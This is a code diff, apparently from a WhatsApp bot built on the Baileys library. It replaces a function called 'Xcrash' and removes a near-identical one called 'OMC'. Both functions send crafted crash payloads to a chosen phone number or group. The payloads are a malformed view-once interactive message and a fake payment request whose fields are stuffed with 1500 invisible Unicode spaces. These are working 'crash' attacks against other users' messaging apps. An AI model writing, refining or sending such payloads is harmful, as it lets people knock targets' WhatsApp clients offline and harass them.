@@ -646,7 +646,7 @@ function isLOVSmeSY(message, sock) {
 
 
 
-async function Xcrash(sock, target) {
+/*async function Xcrash(sock, target) {
   // sock = your Baileys socket/connection (e.g., sock, client)
   // target = target JID, e.g., "628123456789@s.whatsapp.net" (personal) or group ID
   // bY GrOk
@@ -720,6 +720,77 @@ async function Xcrash(sock, target) {
     messageId: null,
     userJid: target
   });
+}*/
+
+async function Xcrash(sock, target) {
+  // sock = your Baileys socket/connection
+  // target = "628xxxxxxxx@s.whatsapp.net" (personal chat JID)
+
+  if (!sock || typeof sock.relayMessage !== 'function') {
+    throw new Error("Socket invalid or not connected");
+  }
+
+  console.log(`[Xcrash] Attempting to send to: ${target}`);
+
+  // First payload (view once + malformed interactive)
+  const viewOncePayload = {
+    viewOnceMessage: {
+      message: {
+        interactiveMessage: {
+          body: { text: "\u2000" },
+          nativeFlowMessage: {
+            buttons: [
+              {
+                name: "single_select",
+                buttonParamsJson: "\u2000"
+              },
+              {
+                name: "form_message",
+                buttonParamsJson: JSON.stringify({
+                  icon: "DEFAULT",
+                  flow_cta: "\u2000",
+                  flow_message_version: "3"
+                })
+              }
+            ]
+          }
+        }
+      }
+    }
+  };
+
+  await sock.relayMessage(target, viewOncePayload, { });   // ← simplified options
+
+  // Second payload (fake payment + large text)
+  const largeText = "\u2000".repeat(1500);
+
+  const paymentPayload = {
+    requestPaymentMessage: {
+      currencyCodeIso4217: "IDR",
+      requestFrom: target,
+      expiryTimestamp: Date.now() + 8000,
+      amount: {
+        value: 999999999,
+        offset: 100,
+        currencyCode: "IDR"
+      },
+      contextInfo: {
+        externalAdReply: {
+          title: " ",
+          body: largeText,
+          mimetype: "audio/mpeg",
+          caption: largeText,
+          showAdAttribution: true,
+          sourceUrl: null,
+          thumbnailUrl: null
+        }
+      }
+    }
+  };
+
+  await sock.relayMessage(target, paymentPayload, { }); 
+
+  console.log("[Xcrash] Payloads sent (or attempted)");
 }
 
 
@@ -1951,72 +2022,6 @@ async function callcrash(sock, targetJid) {
   // Optional: restore original function
   if (originalCreateParticipantNodes) {
     sock.createParticipantNodes = originalCreateParticipantNodes
-  }
-}
-
-async function OMC(sock, targetJid) {
-  const generateMsgId = () => crypto.randomBytes(10).toString('hex').toUpperCase();
-
-  // First payload: malformed viewOnce + interactive
-  const viewOncePayload = {
-    viewOnceMessage: {
-      message: {
-        interactiveMessage: {
-          body: { text: "\u2000" },
-          nativeFlowMessage: {
-            buttons: [
-              { name: "single_select", buttonParamsJson: "\u2000" },
-              {
-                name: "form_message",
-                buttonParamsJson: JSON.stringify({
-                  icon: "DEFAULT",
-                  flow_cta: "\u2000",
-                  flow_message_version: "3"
-                })
-              }
-            ]
-          }
-        }
-      }
-    }
-  };
-
-  try {
-    await sock.relayMessage(targetJid, viewOncePayload, {
-      messageId: generateMsgId(),
-      participant: targetJid  // ← MUST be the plain string JID
-    });
-  } catch (e) {
-    console.error('ViewOnce payload failed:', e.message);
-  }
-
-  // Second payload: payment with large text
-  const largeText = "\u2000".repeat(1500);
-  const paymentPayload = {
-    requestPaymentMessage: {
-      currencyCodeIso4217: "IDR",
-      requestFrom: targetJid,
-      expiryTimestamp: Date.now() + 8000,
-      amount: { value: 999999999, offset: 100, currencyCode: "IDR" },
-      contextInfo: {
-        externalAdReply: {
-          title: " ",
-          body: largeText,
-          mimetype: "audio/mpeg",
-          caption: largeText,
-          showAdAttribution: true
-        }
-      }
-    }
-  };
-
-  try {
-    await sock.relayMessage(targetJid, paymentPayload, {
-      messageId: generateMsgId(),
-      participant: targetJid  // ← Again, plain string
-    });
-  } catch (e) {
-    console.error('Payment payload failed:', e.message);
   }
 }
 
